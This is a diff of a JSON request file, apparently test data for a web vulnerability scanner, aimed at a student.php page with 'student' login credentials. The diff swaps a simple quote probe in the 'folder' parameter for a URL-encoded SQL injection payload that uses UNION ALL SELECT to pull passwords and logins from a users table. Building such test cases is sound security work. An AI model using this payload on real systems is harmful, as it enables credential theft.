@@ -1,15 +1,27 @@
 [
   {
     "loginpayload": {
-      "submit_login": "Login", 
-      "login": "student", 
-      "password": "student", 
-      "_qf__login_form": ""
+      "submit_login": [
+        "Login"
+      ], 
+      "password": [
+        "student"
+      ], 
+      "login": [
+        "student"
+      ], 
+      "_qf__login_form": [
+        ""
+      ]
     }, 
     "url": "https://app5.com/www/student.php", 
     "param": {
-      "folder": "7%27%23", 
-      "ctg": "messages"
+      "folder": [
+        "7%20UNION%20ALL%20SELECT%201,2,3,password,5,6,login,8,9,10,11,12%20FROM%20users%20%2D%2D"
+      ], 
+      "ctg": [
+        "messages"
+      ]
     }, 
     "header": {
       "Referer": "https://app5.com/www/index.php", 
